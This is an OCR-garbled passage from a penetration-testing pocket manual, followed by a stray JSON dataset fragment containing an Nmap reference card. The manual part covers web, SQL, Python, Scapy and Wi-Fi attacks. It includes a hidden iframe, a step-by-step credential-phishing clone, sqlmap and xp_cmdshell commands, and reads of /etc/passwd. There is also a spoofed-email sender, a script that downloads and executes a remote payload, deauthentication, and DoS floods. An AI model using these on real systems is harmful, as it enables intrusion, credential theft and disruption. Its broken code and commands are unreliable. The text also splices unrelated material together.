frameborder=O\nnoresize=''noresize'' I\nframe src=''/e'' frarneborder=O scrolling=no noresize=noresize ;,\n/frameset\n/html\nEMBEDDED JAVA APPLET (* PLACE WITHIN <BODY> TAG)\napplet archive=''legit.jar'' code=''This is a legit applet'' width=''l''\nheight=\"l\" /applet\n\nEMBEDDED IFRAME\niframe src=\"http://1.1.1.111 width=\"O\" height=\"O\" frameborder=\"O\"\ntabindex=''-1'' title=''ernpty'' style=visibility:hidden;display:none''\n/iframe\n\nFIREFOX TYPE CONVERSIONS\nASCII Base64 javascript:btoa(''ascii str'')\nBase64 ASCII javascript:atob(\"base64==\")\nASCII URI javascript:encodeURI('' ·script ''}\nURI ASCII javascript:decodeURI(\"%3cscript%3E\")\n\nWGET\n\nCAPTURE SESSION TOKEN\nwget -q --save-cookies=cookie.txt --keep-session-cookies --post\ndata=\"username: admin&password=pass&Login=Login\" http: I I .. url ,. I login. php\n68\n\nCURL\n\nGRAB HEADERS AND SPOOF USER AGENT\ncurl -I -X HEAD -A \"t~ozilla/5.0 (compatible; HSIE \".01; Windows NT 5.0)\"\nhttp:// ip\n\nSCRAPE SXTE AFTER LOGXN\ncurl -u user:pass -o outfile https://login.bob.com\nFTP\ncurl ftp://user:pass@bob.com/directory/\n\nSEQUENTXAL LOOKUP\ncurl http://bob.com/file[l-10] .txt\n\nBASIC AUTHENTICATION USING APACHE2\nThe steps below will clone a website and redirect after 3 seconds to\nanother page requiring basic authentication. It has proven very useful for\ncollecting credentials during social engineering engagements.\n1. Start Social Engineering Toolkit (SET)\n/pentest/exploits/set/./set\n2. Through SET, use the 'Website Attack Vector' menu to clone your\npreferred website. ' Do not close SET '\n3. In a new terminal create a new directory (lowercase L)\nmkdir /var/www/1\n4. Browse to SET directory and copy the cloned site\ncd /pentest/exploits/set/src/web clone/site/template/\ncp index.html /var/www/index.html\ncp index.html /var/www/1/index.html\n5. Open /var/www/index.html and add tag between head tags\nmeta http-equiv=''refresh''\ncontent-\"3;url-http:// domainlip /1/index.html\"/\n6. Create blank password file to be used for basic auth\ntouch /etc/apache2/.htpasswd\nOpen /etc/apache2/sites-available/default and add:\nDirectory /var/www/1\nAuthType Basic\nAuthName \"PORTAL LOGIN BANNER\"\nAuthUserFile /etc/apache2/.htpasswd\nRequire user test\n/Directory\n8. Start Apache2\n/etc/init.d/apache2 start\n9. Start Wireshark and add the filter:\nhttp.authbasic\n10. Send the following link to your target users\nhttp:// domainlip /index.html\n69\n\nAUTOMATED WEB PAGE SCREENSHOTS\nNMAP WEB PAGE SCREENSHOTS[9]\nInstall dependencies:\nwget http://wkhtmltopdf.googlecode.com/files/wkhtmltoimage-0.11.0 rc1-\nstatic-i386.tar.bz2\ntar -jxvf wkhtmltoimage-0.11.0 rc1-statlc-i386.tar.bz2\ncp wkhtmltoimage-i386 /usr/local/bin/\nInstall Nmap module:\ngit clone git://github.com/SpiderLabs/Nmap-Tools.git\ncd Nmap-Tools/NSE/\ncp http-screenshot.nse /usr/local/share/nmap/scripts/\nnmap --script-updatedb\nOS/version detection using screenshot script (screenshots saved as .png):\nnmap -A -script=http-screenshot -p80,443 1.1.1.0/24 -oA nmap-\nscreengrab\nScript will generate HTML preview page with all screenshots:\n#!/bin/bash\nprintf \" HTHL.- BODY BR \" preview.html\nls -1 '.png I awk -F : ' {print $1\":\"$2\"\\n BR- IMG SRC=\\\"\"$1\"%3A\"$2\"\\\"\nwidth=400 BR BR \")' preview. html\nprintf \" /BODY /HTML. \" preview. html\n\nPEEPINGTOM WEB PAGE SCREENSHOTS\nInstall Dependencies:\nDownload Phantomjs\nhttps://phantomjs.googlecode.com/files/phantomjs-1.9.2-linux-x86_64.tar.bz2\nDownload PeepingTom\ngit clone https://bitbucket.org/LaNMaSteR53/peepingtom.git\nExtract and copy phantomjs from phantomjs-1.9.2-linux-x86 64.tar.bz2 and\ncopy to peepingtom directory\nRun PeepingTom\npython peepingtom.py http:// mytarget.com\n70\n\nSQLMAP\n\nGET REQUEST\n./sqlmap.py -u \"http:// url ?id=1&str=val\"\n\nPOST REQUEST\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\"\n\nSQL INJECTION AGAINST SPECIFIC PARAMETER WITH DB TYPE SPECIFIED\n./sqlmap.py -u ''http:// url '' --data=''id=l&str=val'' -p ''id''\n-b --dbms=\" mssqllmysqlloraclelpostgres \"\n\nSQL INJECTION ON AUTHENTICATED SITE\n1. Login and note cookie value (cookie1=val1, cookie2=val2)\n./sqlrnap.py -u ''http://· url '' --data=''id=l&str=val'' -p ''id''\n--cookie=''cookiel=vall;cookie2=val2''\n\nSQL INJECTION AND COLLECT DB VERSION 1 NAME 1 AND USER\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\" -p \"id\" -b --current-db\n--current-user\nSQL INJECTION AND GET TABLES OF DB=TESTDB\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\" -p \"id\" --tables -D\n11testdb11\n•\n\nSQL INJECTION AND GET COLUMNS OF USER TABLE\n./sqlrnap.py -u \"http:// url \" --data=\"id=l&str=val\" -p \"id11 --columns -T\n\"users\"\n71\n,_ N\n\nMS-SQL\nSELECT @@version DB version\nEXEC xp_msver Detailed version info\nEXEC master .. xp_cmdshell 'net user' Run OS command\nSELECT HOST_ NA11E () Hostname & IP\nSELECT DB_ NA11E I) Current DB\nSELECT name FROM master .. sysdatabases; List DBs\nSELECT user name() Current user\nSELECT name FROM master .. sjslogins List users\nSELECT name FROM master .. sjsobjects WHERE List tables\nXtjpe= 'U';\nSELECT name FROM SjScolumns WHERE id-(SELECT List columns\nid FR0t1 SJSObj ects WHERE name-'mjtable' ) ;\n\nSYSTEM TABLE CONTAINING INFO ON ALL TABLES\nSELECT TOP 1 TABLE NAME FROl1 INFORl1ATION SCHEt1A. TABLES\nLIST ALL TABLES/COLUMNS\nSELECT name FROl-1 Sjscol-:;:r.ns WHERE id (SELECT id FROM Sjsobjects WHERE\nname= 'mjtable')\nPASSWORD HASHES (2005)\nSELECT name, password hash FROM master.sjs.sgl logins\n\nPOSTGRES\nSELECT inet server_addr() Hostname & IP\nSELECT current database(); Current DB\nSELECT datname FROM pg database; List DBs\nSELECT user; Current user\nSELECT username FROM pg_user; List users\nSELECT username,passwd FROM pg shadow List password hashes\n\nLIST COLUMNS\nSELECT relname, A.attnaxe FROl1 pg_class c, pg_namespace N, pg_attribute A,\npg_tjpe T WHERE (C.relkind-'r') AND (~.oid-C.relnamespace) AND\n(A.attrelid-C.oid) AND (A.atttjpid-T.oid) AND (A.attnum 0) AND (NOT\nA.attisdropped) AND (N.nspname ILIKE 'public')\n\nLIST TABLES\nSELECT c.relname FROM pg_catalog.pg_class cLEFT JOIN\npg catalog.pg namespace n ON n.old - c.relnamespace WHERE c.relkind IN\n( 'r','') AND n.nspnarne NOT IN ( 'pg catalog', 'pg toast') AND\npg catalog.pg table is visible(c.;id)\n~3\n\nMYSQL\nSELECT @@version; DB version\nSELECT @@hostname; Hostname & IP\nSELECT database(); Current DB\nSELECT distinct (db) FROl1 mjsql.db; List DBs\nSELECT user(); Current user\nSELECT user FROM mJsql.user; List users\nSELECT host,user,password FROM mJsql.user; List password hashes\nLIST ALL TABLES & COLUMNS\nSELECT table schema, table name, column_n ame FR0t1\ninformation scherna.columns WHERE\ntable schema != 'rnysql' AND table schema != 'information schema'\n\nEXECUTE OS COMMAND THROUGH MYSQL\nosql -S ip , port -U sa -P pwd -Q \"exec xp cmdshell 'net user /add user\npassr''\n\nREAD WORLD-READABLE FILES\nUNION ALL SELECT LOAD FILE( '/etc/passwd');\n\nWRITE TO FILE SYSTEM\nSELECT ' FROl1 mjtable INTO dumpfile '/tmp/ somefile';\n\nORACLE\nSELECT • FROM v$version; DB version\nSELECT version FROM v$instance; DB version\nSELECT instance name FROM v$instance; Current DB\nSELECT name FROM v$database; Current DB\nSELECT DISTINCT owner FROM all tables; List DBs\nSELECT user FROM dual; Current user\nSELECT username FROM all users ORDER BY List users\nusername;\nSELECT column name FR0l1 all tab columns; List columns\nSELECT table name FROM all tables; List tables\nSELECT name, -password, astatus FROt1 SJS.user$; List password hashes\nLIST DBAs\nSELECT DISTINCT grantee FR0t1 dba SfS_prlvS WHERE ADlHN OPTION I YES I;\n'4\nl- '\"\n\nPYTHON\n\nPYTHON PORT SCANNER\nimport socket as sk\nfor port in range (1, 1024):\ntrj:\ns~sk. socket ( sk .AF_ INET, sk. SOCK_ STRE.Z\\t1)\ns.settimeout(1000)\ns. connect ( (' 12~. 0. 0. l', port) )\nprint '%d:OPEN' % (port)\ns.close\nexcept: continue\n\nPYTHON BASE64 WORDLIST\n#!/usr/bin/pjthon\nimport base64\nfilel=open(''pwd.lst'',''r'')\nfile2=open(''b64pwds.lst'',''w'')\nfor line in filel:\nclear= \"administrator:\"+ str.strip(line)\nnew= base64.encodestring(clear)\nfile2.write(new)\n\nCONVERT WINDOWS REGISTRY HEX FORMAT TO READABLE ASCII\nimport binascii, SJS, string\ndataFormatHex ~ binascii.a2b hex(SJS.argv[i])\noutput = ''''\nfor char in dataFormatEex:\nif char in string.printable: output += char\n1 else: output += ''.''\n• print ''\\n'' + output\n\nREAD ALL FILES IN FOLDER AND SEARCH FOR REGEX\nimport glob, re\nfor msg in glob.glob('/tmp/' .txt'):\nfiler ~ open I (msg), 'r' I\ndata ~ fi1er.read()\nmessage= re.findall(r' message (.'?) /message ', data,re.DOTALL)\nprint ''File %s contains %s'' % (str(msg) ,message)\nfi1er.c1ose()\n\nSSL ENCRYPTED SIMPLEHTTPSERVER\nCreate SSL cert (follow prompts for customization)\nopenssl req -new -x509 -keyout cert.pem -out cert.pern -days 365 -nodes\nCreate httpserver.pj\nimport BaseHTTPServer,SimpleHTTPServer,ssl\ncert = ''cert.pem''\nhttpd ~ BaseHTTPServer.HTTPServer( ('192.168.1.10' ,443),\nSimp1eHTTPServer.SimpleHTTPRequestHandler)\nhttpd.socket = ssl.wrap socket(httpd.socket,certflle=cert,server side=True)\nhttpd.serve forever()\n\nPYTHON HTTP SERVER\npython -m SimpleHTTPServer 8080\n*\nPYTHON EMAJ:L SENDER ( SENDMAJ:L MUST BE INSTALLED)\n#!/usr/bin/python\nimport smtplib, string\nimport os, time\nos.system(\"/etc/init.d/sendmail start\")\ntime.sleep(4)\nHOST = ''localhost''\nSUBJECT = \"Email from spoofed sender\"\nTO = ''target@you.corn''\nFROM= \"spoof@spoof.com\"\nTEXT = \"Message Body\"\nBODY = string.join( (\n\"From: %s\" % FROH,\n''To: %s'' % TO,\n\"Subject: %s\" % SUBJECT ,\n\nTEXT\n) , \"\\r\\n\")\nserver = smtplib.SMTP(HOST)\nserver.sendmail(FROM, [TO], BODY)\nserver. quit ()\ntime.sleep(4)\nos.system(\"/etc/init.d/sendmail stop\")\nLOOP THROUGH IP LIST, DOWNLOAD FILE OVER HTTP AND EXECUTE\n#!/usr/bin/python\nimport urllib2, os\nurls = [111.1.1.1'',\"2.2.2.2\"]\nport = 1180\"\npayload = \"cb.sh\"\nfor url in urls:\nu = \"http://%s:%s/%s\" % (url, port, payload)\ntry:\nr = urllib2.urlopen(u)\nwfile = open{\"/tmp/cb.sh\", \"wb\")\nwfile.write(r.read())\nwfile. close ()\nbreak\nexcept: continue\nif os.path.exists(\"/tmp/cb.sh\"):\nos.system(\"chmod -oo /tmp/cb.sh\")\nos. system ( \"/tmp/cb. sh\")\n78\nPYTHON HTTP BANNER GRABBER (* TAKES AN IP RANGE, PORT, AND\nPACKET DELAY)\n#!/usr/bin/python\nimport urllib2, sys, time\nfrom optparse import OptionParser\nparser= OptionParser()\nparser.add option{''-t'', dest=''iprange'',help=''target IP range, i.e.\n\n192.168.1.1-25\")\nparser.add option(''-p'', dest=''port'',default=''80'',help=''port, default=BO'')\nparser.add=option(\"-d\", dest=\"delay\",default=\".5\",help=\"delay (in seconds),\ndefault=.5 seconds\")\n(opts, args) = parser.parse_args()\nif opts.iprange is None:\nparser.error(\"you must supply an IP range\")\nips = []\nheaders={}\noctets= opts.iprange.split(' .')\nstart= octets[3] .split('-') [0]\nstop = octets [ 3] . split ( '-' ) [ 1]\nfori in range(int(start),int(stop)+1):\nips.append('%s.%s.%s.%d' % (octets[O],octets[1] ,octets[2],i))\nprint '\\nScanning IPs: %s\\n' % (ips)\nfor ip in ips:\ntry:\nJ response= urllib2.urlopen('http://%s:%s' % (ip,opts.port))\nheaders[ip] = dict(response.info())\nexcept Exception as e:\n' headers[ip] = \"Error: \" + str(e)\ntime.sleep(float(opts.delay))\nfor header in headers:\ntry:\nprint '%s : %s' % (header,headers[header] .get('server'))\nexcept:\nprint '%s : %s' % (header,headers[header])\n\"9\n\nSCAPY\n* When you craft TCP packets with Scapy, the underlying OS will not\nrecognize the initial SYN packet and will reply with a RST packet. To\nmitigate this you need to set the following Iptables rule:\niptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP\nfrom scapy.all import * Imports all scapy libraries\nls () List all avaiable protocols\nlsc () List all scapy functions\nconf Show/set scapy config\nIP(src=RandiP()) Generate random src IPs\nEther(src=Randl1AC() I Generate random src MACs\nip=IP(src=\"l.l.l.l\",dst=\"2.2.2.2\") Specify IP parameters\ntcp=TCP(dport=\"443\") Specify TCP parameters\ndata=11TCP data\" Specify data portion\npacket=ip/tcp/data Create IP()/TCP() packet\npacket. show ( I Display packet configuration\nsend(packet,count=l) Send 1 packet @ layer 3\nsendp(packet,count=2) Send 2 packets @ layer 2\nsendpfast(packet) Send faster using tcpreply\nsr(packet) Send 1 packet & get replies\nsrl(packet) Send only return 1st reply\nfori in range(O,lOOO): send (packet·) Send packet- 1000 times\nsniff(count=lOO,iface=ethO) Sniff 100 packets on ethO\nSEND IPv6 ICMP MSG\nsr ( IPv6 ( src=\" ipv6 n' dst=\".ipv6 n I /ICHP (I I\ntn)p PACKET W/ SPECIFIC PAYLOAD:\nip=IP(src=''·.ip.·'', dst=''·.ip. '')\nu=UDP(dport=l234, sport=5678)\npay = \"my UDP packet\"\npacket=ip/u/pay\npacket. show ( )\nwrpcap (\"out.pcap\",packet) write to pcap\nsend(packet)\n\nNTP FUZZER\npacket=IP(src=\"·.ip 11,\ndst=\" ip \")/UDP(dport=l23)/fuzz(NTP(version=4,mode=4) I\n\nSEND HTTP MESSAGE\nfrom scapy.all import *\n# Add iptables rule to block attack box from sending RSTs\n# Create web.txt with entire GET/POST packet data\nfileweb = open(''web.txt'','r')\ndata = fileweb.read()\nip = IP(dst=\"-ip ·\")\nSYN=ip/TCP(rport=RandNum(6000,-000),dport=BO,flags=\"S\",seq=4)\nSYNACK = srl(SYN)\nACK=ip/TCP(sport=SYNACK.dport,dport=BO,flags=\"A\",seq=SYNACK.ack,ack=SYNACK.\nseq+l)/data\nreply,error = sr(ACK)\nprint reply.show()\n80\n\nPERL\n\nPERL PORT SCANNER\nuse strict; use IO: :Socket;\nfor($port~O;$port 65535;$port++) {\n$remote~IO::Socket::INET- new(\nProto= ·\"tcp\",PeerAddr= ·1112-:'.0.0.l\",PeerPort= $port);\nif($remote) {print \"$port is open\\n\"); )\n•\n'\n81\n\nREGEX EXPRESSIONS\nStart of string\n0 or more\n+ 1 or more\n0 or 1\nAny char but \\n\n{3} Exactly 3\n{3,} 3 or more\n{3,5} 3 or 4 or 5\n{315} 3 or 5\n[345] 3 or 4 or 5\n[ A34] Not 3 or 4\n[a-z] lowercase a-z\n[A-Z] uppercase A-Z\n[0-9] digit 0-9\n\\d Digit\n\\D Not digit\n\\w A-Z,a-z,0-9\n\\W Not A-Z,a-z,0-9\n\\s White Space (\\t\\r\\n\\f)\n\\S Not (\\t\\r\\n\\f)\n'\nreg[ex] \"rege\" or \"regx\"\nregex? ''rege'' or ''regex''\nregexk ''rege'' w/ 0 or more x\nregex+ ''rege'' w/ 1 or more x\n[Rr]egex ''Regex'' or ''regex''\n\\d{3} Exactly 3 digits\n\\d{ 3,) 3 or more digits\n[aeiou] Any 1 vowel\n(0 [3-9] 11 [0-9]12 [0-5]) Numbers 03-25\n82\n\nASCII TABLE\nxOO : NUL x4b : K\nx08 : BS x4c : L\nx09 : TAB x4d : M\nxOa : LF x4e : N\nxOd : CR x4f : 0\nxlb : ESC x50 : p\nx20 : SPC x51 : Q\nx21 : ! x52 : R\nx22 : \" x53 : s\nx23 : # x54 : T\nx24 : $ x55 : u\nx25 : % x56 : v\nx26 : & x57 : w\nx2\" : x58 : X\nx28 : I x59 : y\nx29 : ) x5a : z\nx2a : x5b : [\nx2b : + x5c : \\\nx\nx2\n2\nd\nc :\n:\n-'\nx\nx5\n5\nd\ne\n: l\nx2e : x5f\nx2f : I x60 : -;-\nx30 : 0 x61 : a\nx31 : 1 x62 : b\nx32 : 2 x63 : c\nx33 : 3 x64 : d\nx34 : 4 x65 : e\nx35 : 5 x66 : f\nx36 : 6 x6\" : g\nxr : x68 : h\nx38 : 8 x69 : i\nx39 : 9 x6a : j\nx3a : : x6b : k\nx3b : ; x6c : 1\nI x3c : x6d : m\nx3d : = x6e : n\nx3e : x6f : o\nx3f : ? x\"O : p\nx40 : @ x-1 : q\nx41 :A x\"2 : r\nx42 : B x\"3 : s\nx43 : c x74 : t\nx44 : D x-s : u\nx45 : E x\"6 : v\nx46 : F x-- : w\nx4\" : G x-8 : X\nx48 : H x\"9 : y\nx49 : I x'a\nx4a : J\n83\n\nFREQUENCY CHART\nRFID 120-150 kHz (LF)\n\n13.56 t1Hz (HF)\n433 t1Hz (lJHF)\nKeyless Entry 315 t1Hz (N. Am)\n\n433.92 MHz (Europe,Asia)\nCellular (lJS) 698-894 HHz\n1-lo-1-55 t1Hz\n1850-1910 t1Hz\n2110-2155 t1Hz\nGPS 122-.60,15~5.42 MHz\nL Band 1-2 GHz\n\n802.15.4 (ZigBee) 868 MHz (Europe)\n915 MHz (lJS,Australia)\n\n2.4 GHz (worldwide)\n\n802.15.1 (Bluetooth) 2.4-2.483.5 GHz\n802 .llb/g 2.4 GHz\n\n802.11a 5.0 GHz\n802 .lln 2.4/5.0 GHZ\nC Band 4-8 GHz\nKu Band 12-18 GHz\nK Band 18-26.5 GHz\nKa Band 26.5-40 GHz\n\nFCC ID LOOKUP\njhttps://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm\n\nFREQUENCY DATABASE\nhttp://www.radioreference.com/apps/db/\n;)\nKISMET REFERENCE [5]\ne List Kismet servers\nh Help\nToggle full-screen view\nn Name current network\nm Toggle muting of sound\ni View detailed information for network\nt Tag or untag selected network\nSort network list\ng Group tagged networks\nl Show wireless card power levels\nu Ungroup current group\nd Dump printable strings\nc Show clients in current network\nr Packet rate graph\nL Lock channel hopping to selected channel\na View network statistics\nH Return to normal channel hopping\np Dump packet type\n+I- Expand/collapse groups\nf Follow network center\nCTRL+L Re-draw the screen\nw Track alerts\nQ Quit Kismet\nX Close popup window\n85\n\nLINUX WIFI COMMANDS\nrfl:ill list Identify wifi problems\nrfkill unblock all Turn on wifi\nairdump-ng monO Monitor all interfaces\n\nCONNECT TO UNSECURED WIFI\niwconfig athO essid $SSID\nifconfig athO up\ndhclient athO\n\nCONNECT TO WEP WIFI NETWORK\niwconfig athO essid $SSID kej kej\nifconfig athO up\ndhclient athO\n\nCONNECT TO WPA-PSK WIFI NETWORK\niwconfig athO essid $SSID\nifconfig athO up\nwpa_supplicant -B -i athO -c wpa-psk.conf\ndhclient athO\n\nCONNECT TO WPA-ENTERPRISE WIFI NETWORK\niwconfig athO essid $SSID\nifconfig athO up\nwpa suppl1cant -B -i athO -c wpa-ent.conf\ndhclient athO\n\nLINUX BLUETOOTH\nhciconfig hciO up Turn on bluetooth interface\nhcitool -i hciO scan --flush --all Scan for bluetooth devices\nsdptool browse BD_ADDR List open services\nhciconfig hciO name \"NAME\" class Ox520204 Set as discoverable\npi scan\npand -K Clear pand sessions\n86\n\nLINUX WIFI TESTING\n\nSTART MONITOR MODE INTERFACE\nairmon-ng stop athO\nairmon-ng start wifiO\niwconfig athO channel $CH\n\nCAPTURE CLIENT HANDSHAKE\nairdump-ng -c $CH --bssid $AP -w file athO #Capture traffic\naireplay-ng -0 10 -a $AP -c $CH athO #Force client de-auth\n\nBRUTE FORCE HANDSHAKE\naircrack-ng -w wordlist capture.cap # WPA-PSK\nasleep -r capture.cap -w dict.asleep # LEAP\neapmd5pass -r capture.cap -w wordlist # EAP-HDS\n\nDOS ATTACKS\nmdk3 int a -a $AP #Auth Flood\nmdk3 int b -c $CH #Beacon Flood\nl\ns-\nor or\n00 m\n'\" 0\n-\nw N\n\nREFERENCES\n[1] t1ubix. Linux/Unix/BSD Post-Exploitation Command List.\nhttp://bit.ly/nucONO. Accessed on 1- Oct 2012.\n[2] Tomes, Tim. Safely DGmping Hashes from Live Domain Controllers.\nflcto~g_l_cigtcorr.:._· com/1..QlUll.Lsafel·r-dumping-hashes-_from-li v. html. Accessed\non 14 Nov 2012.\n[ 3] Reverse She 11 Cheat Sheet. ll!J~..Q_; __ L.L£.£D_t_~_.§_~nhQI'~§..:L__!_net /cheat\nsheet/shells/reverse-shell-cheat-sheet. Accessed on 15 Nov 2012.\n[4] Damele, Bernardo. Reverse Shell One-liners.\nhtto://bernardodame1e.blogscat.com/2Jll/09/reverse-shel-s-one-liners.html.\nAccessed on 15 Nov 2012.\n[5] SANS Institute. IEE 802.11 Pocket Reference Guide.\nhttc://www.willhac}:forsushi.com/paoers/80211 Pocket Reference Guide.pdf.\nAccessed on 16 Nov 2012.\n[6] Tomes, Tim. Remote t1alware Deployment and a Lil' AV Bypass.\nhttp://oauldotcom.com/2012/C51remote-malware-deplo·;ment-and.html. Accessed\non 22 Jan 2013.\n[0] Trusted Sec. Powershell Poe.\nhttos://\\Jww.trusredsec.com/dow~loads/tools-downloadi. Accessed on 25 Jan\n2013.\nFollowing copyright and disclaimer apply:\nCopyright 2012 TrustedSec, LLC. All rights reserved.\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted prov~ded that the following conditions are met:\nRedistributions in binarJ form must reproduce the above copJright notice,\nthis list of conditions a~d the following disclaimer in the documentation\nand/or other materials provided with the distribution.\nTHIS SOFTWARE IS PROVIDED BY TRUSTEDSEC, LLC \"AS IS\" AND ANY EXPRESS OR\nIt1PLIED WARRANTIES, INCLUDING, BUT NOT LitHTED TO, THE It1PLIED WARRANTIES\nOF t1ERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAit1ED. IN\nNO EVENT SHALL TRUSTEDSEC, LLC OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,\nINDIRECT, INCIDENTAL, SPECIAL, EXEt1PLARY, OR CONSEQUENTIAL DAt1AGES\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\nLIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY\nOUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH\nDAt1AGE.\nThe views and conclusions co~tained in the software and documentation are\nthose of the authors and should not be interpreted as representing official\npolicies, either expressed or implied, of TRUSTEDSEC, LLC.\n[8] SSL and stunnel. httc://www.J:ioptrix.com/blcq/?o=68-. Accessed on 01\nFeb 2013.\n[9] ''Using Nrnap to Screenshot Web Services''.\nh t to:/ /blog. spider labs. com /:2 012/0 6/usinq-nrnao-to-screenshot -'deb\nservices.html. Accessed on 26 Feb 2013.\n[10] ''Schtasks Persistence with PowerShell One Liners''.\nhttc://blog.strategicc··ber.com/2013/11/09/schtasl:s-oers~stence-with-\n2._c:>·,v~_f ___~ t.e11-on_ _ ~.:::-__ L+.. . ners_/_. Accessed on 21 Nov 2013.\n94\n---~-·----·-----~-\"\"'\"'\"\"\"~-~ ....~\n\nINDEX\nA K s\nAirmon-ng ......................... 87 Kali .................................... 12 Scapy ................................. 80\nARPing Kismet ............................... 85 Screen ............................... 11\nASCII Table ........................ 83 SNMP ................................ 38\nSNMPWalk ........................ 38\n8 Socat ........................... 37, 47\nLinux\nSocks ........................... 47, 58\nBasic Auth ......................... 69 Chkconfig\nSolaris\nBeEF .................................. 68 Files .............................. 7\nSQLMap\nBluetooth ......................... 86 Mount SMB ................. 12\n\nSSH .................................... 55\nScripting ........................ 8\nc Callback ......................... 9\nUpdate-rc.d ................. 11\nStunnel. ............................ .47\nWifi .............................. 86\nCisco Subnetting ........................ 36\nCurl M\nT\nD Metasploit ........................ 56\nTandberg ......................... .48\nMSFPayload ................ 56\nDNS ................... 8, 30, 39, 43 TCPDump .................... 12, 39\nMSFVenom .................. 56\nDNSRecon ......................... 39 TCPReplay ......................... 39\nMeterpreter ................ 24, 58\nDSQuery ............................ 28 Tunneling ......................... .47\nMimikatz ........................... 61\nE MSSQL u\nMySQL\nEmail Sender ..................... 23 User-Agents\nEttercap ............................ 60 N\nv\nF Netcat ......................... 44, 53\ni Nmap ........................ 39, 51 VLC. ................................... 54\nFCC. .................................. 85 Screenshot ................. 70 Volume Shadow Copy ...... 21\nFile Transfer ..................... .43 VPN\n\\ Fpipe ................................ .47 0 VSSOwn ........................... 63\n',Frequencies ...................... 85 VTC\nOpen Mail Relay .............. .43\nl:=TP ................................... .43\nOracle w\nG\np\nWget ................................. 68\nf,ioogle Windows ........................... 15\nPassword Wordlist ............ 62\nGRUB AT Command ............. .46\nPeeping Tom ...................... 70\nEscalation .................... 31\nH Peri\nFirewall ....................... 18\nPersistence ................ .46, 59\nHashing ............................. 64 pfSense Makecab\nfHping3 Polycom ........................... .48 Port Fwd ...................... 18\nHydra Ports RDP ............................. 19\nRegistry ....................... 26\nPostgres ............................ 73\nRemoting ..................... 16\nPowershell ........................ 22\nScripting ...................... 30\nICMP Authentication Popup .23\nStartup\nlframe .............................. 68 Run as\nTask Scheduler ...... 32, 46\nIKE-Scan ........................... .40 Proxychains ....................... 58\nWebDAV ...................... 46\nIPtables ............................. 10 PSEXEC ........................ 18, 46\nWine\n1Pv4 ................................... 36 Putty\n1Pv6 .................................. 37 Python\nJ R\nX\nJAVA Applet ...................... 68 Railgun .............................. 58\nX11 .............................. 12, 55\nJohn the Ripper ................. 62 Regex ................................ 82\nXterm ............................... .45\nReverse Shells ................... 44\n95\nScripting Engine Notable Scripts Nmap\nCheat Sheet\n-sC Run default scripts\nA full list of Nmap Scripting Engine scripts is\n--script=<ScriptName>| v1.0\navailable at http://nmap.org/nsedoc/\n<ScriptCategory>|<ScriptDir>...\n!"
  },
  {
    "input": "What are the common TCP and UDP port numbers associated with various services and protocols, and how can they be used in network scanning and reconnaissance?",
    "summary": "This text provides a guide to using Nmap for network scanning, including how to run scripts, specify targets, and use various scan types and options. It also lists common TCP/UDP port numbers and their associated services. Additionally, it explains how to use search operators for specific queries on the SANS Institute website.",
    "output": "POCKET REFERENCE GUIDE\nRun individual or groups of scripts\nSANS Institute\nSome particularly useful scripts include:\n--script-args=<Name1=Value1,...> http://www.sans.org\nUse the list of script arguments\n--script-updatedb\ndns-zone-transfer: Attempts to pull a zone file\nBase Syntax\n(AXFR) from a DNS server.\nUpdate script database\n$ nmap --script dns-zone- # nmap [ScanType] [Options] {targets}\ntransfer.nse --script-args dns-zone-\ntransfer.domain=<domain> -p53\nScript Categories Target Specification\n<hosts>\n: :\nIPv4 address: 192.168.1.1\nNmap's script categories include, but are not limited to, the\nIPv6 address: AABB:CCDD::FF%eth0\nfollowing: http-robots.txt: Harvests robots.txt files from\nHost name: www.target.tgt\ndiscovered web servers.\nauth: Utilize credentials or bypass authentication on target IP address range: 192.168.0-255.0-255\n$ nmap --script http-robots.txt\nhosts.\nCIDR block: 192.168.0.0/16\nbroadcast: Discover hosts not included on command line by <hosts>\nbroadcasting on local network. Use file with lists of targets: -iL <filename>\nbrute: Attempt to guess passwords on target systems, for a\nsmb-brute: Attempts to determine valid\nvariety of protocols, including http, SNMP, IAX, MySQL, VNC,\netc. username and password combinations via Target Ports\ndefault: Scripts run automatically when -sC or -A are used. automated guessing.\ndiscovery: Try to learn more information about target hosts $ nmap --script smb-brute.nse -p445 No port range specified scans 1,000 most popular\nthrough public sources of information, SNMP, directory services,\n<hosts> ports\nand more.\ndos: May cause denial of service conditions in target hosts.\nexploit: Attempt to exploit target systems. smb-psexec: Attempts to run a series of -F Scan 100 most popular ports\nexternal: Interact with third-party systems not included in programs on the target machine, using -p<port1>-<port2> Port range\ntarget list.\ncredentials provided as scriptargs. -p<port1>,<port2>,... Port List\nfuzzer: Send unexpected input in network protocol fields.\nintrusive: May crash target, consume excessive resources, or $ nmap --script smb-psexec.nse – -pU:53,U:110,T20-445 Mix TCP and UDP\notherwise impact target machines in a malicious fashion. script-args=smbuser=<username>, -r Scan linearly (do not randomize ports)\nmalware: Look for signs of malware infection on the target\nsmbpass=<password>[,config=<config>] --top-ports <n> Scan n most popular ports\nhosts.\n-p445 <hosts> -p-65535 Leaving off initial port in range makes\nsafe: Designed not to impact target in a negative fashion.\nversion: Measure the version of software or protocol spoken Nmap scan start at port 1\nby target hosts. -p0- Leaving off end port in range makes\nvul: Measure whether target systems have a known\nNmap scan through port 65535\nvulnerability.\n-p- Scan ports 1-65535\nProbing Options Fine-Grained Timing Options Aggregate Timing Options\n-Pn Don't probe (assume all hosts are up) --min-hostgroup/max-hostgroup <size> -T0 Paranoid: Very slow, used for IDS evasion\nParallel host scan group sizes -T1 Sneaky: Quite slow, used for IDS evasion\n-PB Default probe (TCP 80, 445 & ICMP) -T2 Polite: Slows down to consume less\n--min-parallelism/max-parallelism bandwidth, runs ~10 times slower than\n-PS<portlist>\n<numprobes>\ndefault\nCheck whether targets are up by probing 